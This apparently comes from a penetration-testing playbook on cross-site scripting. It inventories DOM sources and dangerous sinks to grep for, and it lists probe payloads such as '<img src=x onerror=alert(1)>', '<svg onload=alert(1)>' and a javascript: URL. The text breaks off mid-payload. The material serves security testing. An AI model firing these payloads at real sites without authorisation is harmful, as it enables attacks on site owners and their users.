# PB — XSS and DOM sinks

## Preconditions
Reflection point or DOM sink reachable from a URL.

## Recipes

**Source inventory.** `location.hash`, `location.search`, `location.href`, `document.referrer`,
`window.name`, `postMessage`, `localStorage`, `opener`. Grep the bundle for each.

**Sink inventory.** `innerHTML`, `insertAdjacentHTML`, `document.write`, `eval`,
`new Function`, `srcdoc`, `setAttribute('href', ...)`, `jQuery.html()`,
`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`.

**Minimal markers.** `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`,
`"><img src=x onerror=alert(1)>`, `javascript:alert(1)` in an href builder,
`data:text/html,<script>alert(1)